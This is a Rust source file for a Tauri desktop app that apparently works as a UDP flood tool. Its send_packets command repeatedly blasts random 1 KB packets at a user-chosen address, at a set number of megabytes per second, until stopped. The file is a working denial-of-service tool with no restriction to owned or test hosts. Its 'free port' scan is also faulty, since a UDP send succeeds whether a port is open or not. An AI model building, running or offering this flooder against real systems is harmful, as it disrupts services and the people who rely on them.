use std::{
    array,
    net::UdpSocket,
    sync::Mutex,
    thread::{self},
    time::{Duration, Instant},
};

use rand::Rng;
use states::AppState;
use tauri::State;

mod states;
mod console;

// make getters and setters async because mutex's lock() blocks threads
#[tauri::command]
async fn get_send_packets(state: State<'_, Mutex<AppState>>) -> Result<bool, ()> {
    let state = state.lock().unwrap();
    Ok(state.send_packets)
}

#[tauri::command]
async fn set_send_packets(state: State<'_, Mutex<AppState>>, value: bool) -> Result<(), ()> {
    let mut state = state.lock().unwrap();
    state.send_packets = value;
    Ok(())
}

#[tauri::command]
async fn send_packets(
    state: State<'_, Mutex<AppState>>,
    target_address: String,
    port: Option<String>,
    data_size: usize,
) -> Result<(), ()> {
    console::spawn_console();
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();
    // 1 kb packet
    let mut packet: [u8; 1024] = array::from_fn(|_| u8::MAX as u8);
    let mut rng = rand::rng();

    let port: String = match port {
        Some(value) => value,
        None => {
            let mut free_port: Option<String> = None;

            for port_number in 1..9999 {
                println!("scanning for free ports - attempt [{}]:", &port_number);
                if let Ok(_bytes_written) = socket.send_to(
                    &packet,
                    target_address.clone() + ":" + port_number.to_string().as_str(),
                ) {
                    println!("free port: {}", &port_number);
                    free_port = Some(port_number.to_string());
                    break;
                }
            }
            if let None = free_port {
                println!("no free ports available");
                return Ok(());
            }

            free_port.unwrap()
        }
    };

    let target_address = target_address + ":" + port.as_str();
    // convert to mb to kb
    let iterations = data_size * 1024;
    let mut iteration_start;
    let remaining_time = Duration::new(1, 0);

    loop {
        iteration_start = Instant::now();
        packet.fill_with(|| (&mut rng).random::<u8>());

        {
            let state = state.lock().unwrap();

            if !state.send_packets {
                println!("stopping...");
                break;
            }
        }

        for _ in (0 as usize)..iterations {
            match (&socket).send_to(&packet, &target_address) {
                Ok(_bytes_written) => (),
                Err(error) => println!("failed sending bytes: {}", error),
            }
        }

        println!(
            "succesfully sent {} mb in {:?}",
            &data_size,
            iteration_start.elapsed()
        );
        thread::sleep((&remaining_time).saturating_sub(iteration_start.elapsed()));
    }

    Ok(())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .manage(Mutex::new(AppState::default()))
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![
            get_send_packets,
            set_send_packets,
            send_packets
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
